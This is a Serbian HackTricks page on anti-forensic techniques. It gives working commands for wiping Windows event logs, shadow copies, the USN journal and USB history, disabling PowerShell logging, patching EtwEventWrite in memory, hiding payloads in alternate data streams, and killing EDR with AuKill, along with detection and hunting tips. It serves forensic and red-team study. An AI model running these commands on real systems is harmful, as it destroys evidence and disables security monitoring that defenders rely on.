# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Vremenske oznake

Napadač može biti zainteresovan za **menjanje vremenskih oznaka datoteka** kako bi izbegao otkrivanje.\
Vremenske oznake je moguće pronaći unutar MFT-a u atributima `$STANDARD_INFORMATION` \_\_ i \_\_ `$FILE_NAME`.

Oba atributa imaju 4 vremenske oznake: **izmena**, **pristup**, **kreiranje** i **izmena registra MFT-a** (MACE ili MACB).

**Windows explorer** i drugi alati prikazuju informacije iz atributa **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Ovaj alat **menja** informacije o vremenskim oznakama unutar atributa **`$STANDARD_INFORMATION`**, ali **ne** menja informacije unutar atributa **`$FILE_NAME`**. Zbog toga je moguće **identifikovati** **sumnjivu** **aktivnost**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. Alat [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) omogućava ispitivanje ovih promena.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. ...](<../../images/image (801).png>)

Prethodna slika prikazuje **izlaz** koji je prikazao **alat**, gde se može videti da su neke **promene izvršene** na datoteci.

### $LogFile

**Sve promene metapodataka sistema datoteka beleže se** u procesu poznatom kao [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zabeleženi metapodaci čuvaju se u datoteci pod nazivom `**$LogFile**`, koja se nalazi u root direktorijumu NTFS sistema datoteka. Alati kao što je [LogFileParser](https://github.com/jschicht/LogFileParser) mogu se koristiti za parsiranje ove datoteke i identifikovanje promena.

![Usnjrnl - $LogFile: Sve promene metapodataka sistema datoteka beleže se u procesu poznatom kao write-ahead logging. Zabeleženi metapodaci čuvaju se u datoteci pod nazivom $LogFile, koja se nalazi u root...](<../../images/image (137).png>)

Ponovo, u izlazu alata moguće je videti da su **neke promene izvršene**.

Korišćenjem istog alata moguće je identifikovati **kada su vremenske oznake izmenjene**:

![Usnjrnl - $LogFile: Korišćenjem istog alata moguće je identifikovati kada su vremenske oznake izmenjene](<../../images/image (1089).png>)

- CTIME: Vreme kreiranja datoteke
- ATIME: Vreme izmene datoteke
- MTIME: Izmena registra MFT-a datoteke
- RTIME: Vreme pristupa datoteci

### Poređenje `$STANDARD_INFORMATION` i `$FILE_NAME`

Drugi način za identifikovanje sumnjivo izmenjenih datoteka bio bi poređenje vremena u oba atributa, tražeći **nepodudaranja**.

### Nanosekunde

Vremenske oznake sistema **NTFS** imaju **preciznost** od **100 nanosekundi**. Zato je pronalaženje datoteka sa vremenskim oznakama poput 2010-10-10 10:10:**00.000:0000 veoma sumnjivo**.

### SetMace - Anti-forensic Tool

Ovaj alat može menjati oba atributa, `$STARNDAR_INFORMATION` i `$FILE_NAME`. Međutim, počev od sistema Windows Vista, za izmenu ovih informacija neophodan je live OS.

## Skrivanje podataka

NFTS koristi klastere i minimalnu veličinu informacija. To znači da, ako datoteka zauzima jedan i po klaster, **preostala polovina se nikada neće koristiti** dok se datoteka ne obriše. Zatim je moguće **sakriti podatke u ovom slack prostoru**.

Postoje alati kao što je slacker koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza datoteka `$logfile` i `$usnjrnl` može pokazati da su neki podaci dodati:

![SetMace - Anti-forensic Tool - Skrivanje podataka: Postoje alati kao što je slacker koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza datoteka $logfile i $usnjrnl može pokazati da su...](<../../images/image (1060).png>)

Zatim je moguće preuzeti slack prostor pomoću alata kao što je FTK Imager. Imajte na umu da ova vrsta alata može sačuvati sadržaj kao obfuskovan ili čak šifrovan.

## UsbKill

Ovo je alat koji će **isključiti računar ako se detektuje bilo kakva promena na USB** portovima.\
Jedan od načina da se ovo otkrije jeste pregled aktivnih procesa i **provera svake pokrenute python skripte**.

## Live Linux distribucije

Ove distribucije se **izvršavaju unutar RAM** memorije. Jedini način da se otkriju jeste **u slučaju da je NTFS sistem datoteka montiran sa dozvolama za pisanje**. Ako je montiran samo sa dozvolama za čitanje, neće biti moguće otkriti upad.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows konfiguracija

Moguće je onemogućiti nekoliko Windows metoda logovanja kako bi se forenzička istraga znatno otežala.

### Onemogućavanje vremenskih oznaka - UserAssist

Ovo je registry ključ koji čuva datume i vreme pokretanja svake izvršne datoteke od strane korisnika.

Onemogućavanje UserAssist-a zahteva dva koraka:

1. Postavite dva registry ključa, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` i `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, na nulu kako biste naznačili da želimo da UserAssist bude onemogućen.
2. Obrišite registry podstabla koja izgledaju kao `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Onemogućavanje vremenskih oznaka - Prefetch

Ovo čuva informacije o aplikacijama koje su izvršene sa ciljem poboljšanja performansi Windows sistema. Međutim, ovo može biti korisno i za potrebe forenzike.

- Pokrenite `regedit`
- Izaberite putanju datoteke `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknite desnim tasterom na `EnablePrefetcher` i `EnableSuperfetch`
- Izaberite Modify za svaku od ovih vrednosti kako biste promenili vrednost sa 1 (ili 3) na 0
- Restartujte računar

### Onemogućavanje vremenskih oznaka - vreme poslednjeg pristupa

Kad god se fascikla otvori sa NTFS volumena na Windows NT serveru, sistem beleži vreme kako bi **ažurirao polje vremenske oznake u svakoj navedenoj fascikli**, koje se naziva vreme poslednjeg pristupa. Na intenzivno korišćenom NTFS volumenu ovo može uticati na performanse.

1. Otvorite Registry Editor (Regedit.exe).
2. Idite na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Pronađite `NtfsDisableLastAccessUpdate`. Ako ne postoji, dodajte ovaj DWORD i postavite njegovu vrednost na 1, čime će proces biti onemogućen.
4. Zatvorite Registry Editor i restartujte server.

### Brisanje USB istorije

Svi **unosi USB uređaja** čuvaju se u Windows Registry-ju, pod registry ključem **USBSTOR**, koji sadrži podključeve kreirane svaki put kada priključite USB uređaj na računar ili laptop. Ovaj ključ možete pronaći ovde: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog ključa** obrisaćete USB istoriju.\
Možete koristiti i alat [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) kako biste proverili da li ste ih obrisali (i da biste ih obrisali).

Druga datoteka koja čuva informacije o USB uređajima jeste `setupapi.dev.log`, koja se nalazi u `C:\Windows\INF`. I nju bi trebalo obrisati.

### Onemogućavanje Shadow Copies

**Izlistajte** shadow copies pomoću komande `vssadmin list shadowstorage`\
**Obrišite** ih pokretanjem komande `vssadmin delete shadow`

Možete ih obrisati i putem GUI-ja, prateći korake navedene na stranici [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Da biste onemogućili shadow copies, pratite [korake odavde](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otvorite program Services tako što ćete uneti „services“ u polje za pretragu teksta nakon klika na Windows start dugme.
2. Na listi pronađite „Volume Shadow Copy“, izaberite ga, a zatim otvorite Properties klikom desnim tasterom.
3. Iz padajućeg menija „Startup type“ izaberite Disabled, a zatim potvrdite promenu klikom na Apply i OK.

Takođe je moguće izmeniti konfiguraciju datoteka koje će biti kopirane u shadow copy-ju u registry-ju `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Prepisivanje obrisanih datoteka

- Možete koristiti **Windows alat**: `cipher /w:C` Ovo će naložiti alatu cipher da ukloni sve podatke iz dostupnog neiskorišćenog prostora na disku C.
- Možete koristiti i alate kao što je [**Eraser**](https://eraser.heidi.ie)

### Brisanje Windows event logova

- Windows + R --> eventvwr.msc --> Proširite „Windows Logs“ --> Kliknite desnim tasterom na svaku kategoriju i izaberite „Clear Log“
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Onemogućavanje Windows event logova

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- U odeljku services onemogućite servis „Windows Event Log“
- `WEvtUtil.exec clear-log` ili `WEvtUtil.exe cl`

### Onemogućavanje `$UsnJrnl`

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Novije verzije sistema Windows 10/11 i Windows Server čuvaju **bogate PowerShell forenzičke artefakte** pod
`Microsoft-Windows-PowerShell/Operational` (događaji 4104/4105/4106).
Napadači ih mogu onemogućiti ili obrisati u hodu:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Branitelji treba da prate promene tih registry ključeva i brisanje velikog broja PowerShell događaja.

### ETW (Event Tracing for Windows) Patch

Endpoint security proizvodi se u velikoj meri oslanjaju na ETW. Popularna evaziona metoda iz 2024. godine jeste patchovanje `ntdll!EtwEventWrite`/`EtwEventWriteFull` u memoriji, tako da svaki ETW poziv vraća `STATUS_SUCCESS` bez emitovanja događaja:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Javni PoC-ovi (npr. `EtwTiSwallow`) implementiraju isti primitiv u PowerShell-u ili C++-u.
Pošto je zakrpa **lokalna za proces**, EDR-ovi koji rade unutar drugih procesa mogu da je ne registruju.<sup>[[5]](#references)</sup>
Detekcija: uporedite `ntdll` u memoriji sa verzijom na disku ili postavite hook pre user-mode-a.

### Oživljavanje Alternate Data Streams (ADS)

Malware kampanje iz 2023. godine (npr. **FIN12** loaderi) primećene su kako smeštaju binarne datoteke druge faze
unutar ADS-a da bi ostale van vidokruga tradicionalnih skenera:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerišite stream-ove pomoću `dir /R`, `Get-Item -Stream *` ili Sysinternals alata `streams64.exe`.
Kopiranje host datoteke na FAT/exFAT ili putem SMB-a ukloniće skriveni stream i može se koristiti
za oporavak payload-a od strane istražitelja.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver se sada rutinski koristi za **anti-forensics** tokom ransomware
upada.
Open-source alat **AuKill** učitava potpisani, ali ranjivi driver (`procexp152.sys`) kako bi
suspendovao ili prekinuo rad EDR i forenzičkih senzora **pre šifrovanja i uništavanja logova**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Drajver se nakon toga uklanja, čime ostaje minimalno tragova.<sup>[[1]](#references)</sup>
Mere ublažavanja: omogućite Microsoft vulnerable-driver blocklist (HVCI/SAC)
i generišite upozorenje pri kreiranju kernel servisa iz putanja koje korisnik može da upisuje.

---

## Linux Anti-Forensics: Self-Patching i Cloud C2 (2023–2025)

### Self‑patching kompromitovanih servisa radi smanjenja detekcije (Linux)
Napadači sve češće vrše „self‑patch“ servisa odmah nakon njegovog iskorišćavanja, kako bi sprečili ponovnu eksploataciju i potisnuli detekcije zasnovane na ranjivostima. Ideja je da se ranjive komponente zamene najnovijim legitimnim upstream binarnim datotekama/JAR-ovima, tako da skeneri prijave da je host zakrpljen, dok persistence i C2 ostaju aktivni.<sup>[[3]](#references)</sup>

Primer: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Nakon eksploatacije, napadači su preuzeli legitimne JAR-ove sa Maven Central (repo1.maven.org), obrisali ranjive JAR-ove iz ActiveMQ instalacije i ponovo pokrenuli broker.
- Time je zatvoren početni RCE, dok su drugi foothold-i ostali aktivni (cron, izmene SSH konfiguracije, zasebni C2 implantati).

Operativni primer (ilustrativno)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forenzički/hunting saveti
- Pregledajte direktorijume servisa zbog neplaniranih zamena binarnih datoteka/JAR-ova:
- Debian/Ubuntu: `dpkg -V activemq` i uporedite hash-eve/putanje datoteka sa repo mirror-ima.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Potražite verzije JAR-ova prisutne na disku koje nisu u vlasništvu package manager-a ili simboličke linkove ažurirane mimo standardnog procesa.
- Vremenska linija: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` za korelaciju ctime/mtime sa vremenskim periodom kompromitacije.
- Shell istorija/process telemetry: dokaze o korišćenju `curl`/`wget` ka `repo1.maven.org` ili drugim artifact CDN-ovima neposredno nakon početne eksploatacije.
- Change management: proverite ko je primenio „patch“ i zašto, a ne samo da je patched verzija prisutna.

### Cloud-service C2 sa bearer tokenima i anti-analysis stagerima
Uočeni tradecraft kombinovao je više dugotrajnih C2 putanja i anti-analysis pakovanje:<sup>[[3]](#references)</sup>
- Password-protected PyInstaller ELF loaderi za otežavanje sandboxing-a i static analysis-a (npr. encrypted PYZ, privremena ekstrakcija pod `/_MEI*`).
- Indikatori: `strings` pogoci kao što su `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: ekstrakcija u `/tmp/_MEI*` ili prilagođene `--runtime-tmpdir` putanje.
- Dropbox-backed C2 koji koristi hardcoded OAuth Bearer tokene
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` sa `Authorization: Bearer <token>`.
- Sprovedite hunting u proxy/NetFlow/Zeek/Suricata zapisima za outbound HTTPS ka Dropbox domenima sa server workload-ova koji obično ne sinhronizuju datoteke.
- Paralelni/backup C2 putem tunneling-a (npr. Cloudflare Tunnel `cloudflared`), uz zadržavanje kontrole ako je jedan kanal blokiran.
- Host IOC-ovi: `cloudflared` procesi/unit-i, konfiguracija u `~/.cloudflared/*.json`, outbound 443 ka Cloudflare edge-ovima.

### Persistence i „hardening rollback“ radi održavanja pristupa (Linux primeri)
Napadači često kombinuju self-patching sa trajnim access path-ovima:<sup>[[3]](#references)</sup>
- Cron/Anacron: izmene `0anacron` stub-a u svakom `/etc/cron.*/` direktorijumu radi periodičnog izvršavanja.
- Hunting:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: omogućavanje root login-a i menjanje podrazumevanih shell-ova za low-privileged naloge.
- Hunting radi omogućavanja root login-a:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunting radi otkrivanja sumnjivih interactive shell-ova na system nalozima (npr. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Nasumični beacon artifacts sa kratkim nazivima (8 abecednih karaktera), zapisani na disk i koji takođe kontaktiraju cloud C2:
- Hunting:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders treba da korelišu ove artifacts sa spoljašnjom izloženošću i događajima patching-a servisa kako bi otkrili anti-forensic self-remediation korišćen za prikrivanje početne eksploatacije.

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)

{{#include ../../banners/hacktricks-training.md}}
